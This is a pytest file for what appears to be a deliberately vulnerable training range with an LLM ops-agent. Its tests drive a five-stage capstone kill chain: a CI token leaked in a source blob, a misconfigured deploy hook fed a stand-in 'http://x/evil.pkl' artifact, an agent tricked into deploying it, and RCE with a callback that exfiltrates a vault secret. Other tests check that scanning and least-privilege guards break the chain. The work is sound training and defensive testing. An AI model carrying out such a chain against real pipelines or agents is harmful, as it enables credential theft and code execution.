from halcyon import audit
from halcyon.llm import FinalAnswer, ToolCall

from .conftest import make_chain_client


def _drive_full_chain(client, chain_for, session="p1"):
    tok = chain_for(session).ci_token
    # S1: read the leak blob (records secret_leak_discovered iff the token survives
    # scrubbing -- under SEC_SECRET_SCANNING it won't, and that's the point of
    # test_secret_scanning_breaks_s1, so this call is not asserted on here; the
    # final /validate/chain check is what proves whether S1 actually fired).
    client.get("/source/blob", params={"session": session, "path": ".env.sample"})
    # S2: use the leaked token at the misconfigured deploy hook
    client.post("/internal/deploy", json={
        "session_id": session, "ci_token": tok, "artifact_url": "http://x/evil.pkl"})
    # S3-S5: drive the ops-agent, which deploys -> worker loads -> exfil -> callback
    client.post("/api/ops-agent", json={"session_id": session, "message": "run the runbook"})


def test_full_chain_vulnerable_core_pass():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    # S1 has to actually deliver the token to the participant, not just record
    # the audit event -- core=="pass" alone would not catch an endpoint that
    # fired SECRET_LEAK_DISCOVERED but returned {"content": ""}. The token in
    # the body is what a participant copies into /internal/deploy.
    tok = chain_for("p1").ci_token
    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
    assert tok in blob["content"]
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"


def test_secret_scanning_breaks_s1():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", "SEC_SECRET_SCANNING": "1"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    tok = chain_for("p1").ci_token
    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
    assert tok not in blob["content"]                       # scrubbed
    _drive_full_chain(client, chain_for)                    # rest can't complete
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"


def test_ci_least_priv_breaks_s2():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", "SEC_CI_LEAST_PRIV": "1"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"


def test_reset_chain_clears_pass_and_rotates_secret():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    old = chain_for("p1").vault_master
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"
    client.post("/reset/chain", json={"session_id": "p1"})
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"
    assert chain_for("p1").vault_master != old


def test_full_chain_pass_appears_on_the_board():
    # Before Fix 4, capstone.CORE_EVENTS only covered m1-m8, so GET /board never
    # showed a session that cracked the whole capstone -- the graded closer of
    # the course was invisible on the scoreboard the Day-2 finale is built
    # around. A durable CHAIN_CORE_PASSED marker (not a raw stage event) is now
    # the "chain" entry, so a full pass must surface here.
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"
    board = client.get("/board").json()
    sessions = {s["session"]: s for s in board["sessions"]}
    assert "p1" in sessions
    by_module = {m["module"]: m for m in
                 client.get("/capstone", params={"session": "p1"}).json()["modules"]}
    assert by_module["chain"]["exploited"] is True


def test_chat_page_has_capstone_panel():
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert 'data-tab="CHAIN"' in text and 'data-layer="CHAIN"' in text
    for el in ('id="src-tree"', 'id="src-view"', 'id="deploy-token"', 'id="deploy-url"',
               'id="deploy-btn"', 'id="ops-run"', 'id="chain-stages"',
               'id="chain-validate"', 'id="chain-reset"'):
        assert el in text, f"missing capstone element {el}"


def test_chain_sidebar_explains_process_level_guards():
    # Fix 6: CHAIN's TAB_MODULES entry is deliberately empty (no per-session
    # toggles for process-level flags), so the sidebar must render a legible
    # explanation instead of a bare "Guardrails" header over nothing.
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert "process-level" in text


def test_capstone_learn_panel_renders():
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert "Kill Chain" in text
    assert "SEC_CI_LEAST_PRIV" in text  # the guard snippet's title names the flag (source uses lowercase)


def test_capstone_stage_tracker_keys_match_validator_order():
    # Highest-consequence untested drift: if an event_type string in
    # validators.chain.ORDER is ever renamed without updating the template's
    # CHAIN_STAGE_LABELS keys, the tracker would silently show all five stages
    # unmet forever -- a false fail live in front of participants, with every
    # other test still green. Pin the correspondence here.
    from halcyon.validators.chain import ORDER

    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    for event_type in ORDER:
        assert event_type in text, f"stage key {event_type!r} missing from capstone tracker"


def test_capstone_source_browser_renders_commit_log_and_does_not_spoil_it():
    # S1's actual discovery mechanism is the commit log (source_browser.py's
    # docstring: "the commit log tells a 'committed a token, reverted it'
    # story that lures the participant into git history"). The tree alone
    # ("click the four files") isn't the intended puzzle; nothing server-rendered
    # into /chat -- panel prose or shipped script, both readable via View Source --
    # may spoil that inference either, in any phrasing.
    #
    # The word "revert"/"reverted" is banned outright from this page rather than
    # from one specific phrase: the commit log's own "Revert ..." wording is
    # runtime JSON returned by GET /source/tree, never server-rendered into
    # /chat itself, so this assertion can't collide with that legitimate fixture
    # data -- it only guards the page a participant's View Source actually shows.
    client, _, _ = make_chain_client({"HALCYON_MODE": "vulnerable"}, [])
    text = client.get("/chat", params={"session": "p1"}).text
    assert "data.log" in text              # the commit log is actually rendered
    assert "revert" not in text.lower()    # ...without spoiling what it's for


def test_callback_wrong_secret_is_rejected_and_records_nothing():
    client, store, _chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    r = client.post("/chain/callback", json={"session_id": "p1", "secret": "not-the-secret"})
    assert r.json() == {"status": "rejected"}
    fired = [e for e in store.events_since_reset("p1", "chain")
             if e.event_type == audit.RCE_CONFIRMED]
    assert fired == []


def test_callback_correct_secret_is_accepted():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    secret = chain_for("p1").vault_master
    r = client.post("/chain/callback", json={"session_id": "p1", "secret": secret})
    assert r.json() == {"status": "received"}
    fired = [e for e in store.events_since_reset("p1", "chain")
             if e.event_type == audit.RCE_CONFIRMED]
    assert fired and fired[0].details == {"secret": secret}


def test_callback_wrong_secret_does_not_brick_a_later_legitimate_run():
    # This is the CRITICAL brick scenario: a junk callback fired before the
    # participant (or a neighbour probing the endpoint, since the route takes
    # no session-scoped auth) starts the chain used to pin a bogus rce_confirmed
    # as the *first* occurrence, permanently breaking the validator's ordering
    # check for the rest of the reset-epoch even though the participant then
    # completes every stage legitimately. With the secret check in place, the
    # rejected callback records no event at all, so it can't pin anything.
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    r = client.post("/chain/callback", json={"session_id": "p1", "secret": "junk"})
    assert r.json() == {"status": "rejected"}
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"


def test_deploy_race_records_misconfig_before_mutating_session():
    # This is the IMPORTANT brick scenario (Fix 2): handle_deploy() in web.py's
    # /internal/deploy route must not mutate chain-session state until AFTER
    # MISCONFIG_EXPLOITED has been recorded, so a concurrent /api/ops-agent
    # request can never observe the trusted-write mutation (and so record
    # TRUSTED_INJECTION_FIRED) ahead of the audit event that must precede it in
    # the validator's ordering check. Assert the source itself preserves this
    # ordering, since a real thread-interleaving race can't be reproduced
    # deterministically in a unit test.
    from pathlib import Path

    src = (Path(__file__).parent.parent / "halcyon" / "web.py").read_text()
    start = src.index("def internal_deploy")
    end = src.index("\n    @app.post", start + 1)
    body = src[start:end]
    record_pos = body.index("audit.record")
    apply_pos = body.index("apply_deploy(")
    assert record_pos < apply_pos, (
        "MISCONFIG_EXPLOITED must be recorded before apply_deploy() mutates session state"
    )


def test_main_app_wires_chain_endpoints():
    # main.py must construct create_app with a ChainProvider so /source/tree exists.
    # We read the source file directly instead of importing to avoid database connection
    # requirements that occur at halcyon.main module load time.
    from pathlib import Path

    main_src = Path(__file__).parent.parent / "halcyon" / "main.py"
    src = main_src.read_text()
    assert "ChainProvider" in src
    assert "chain_for" in src
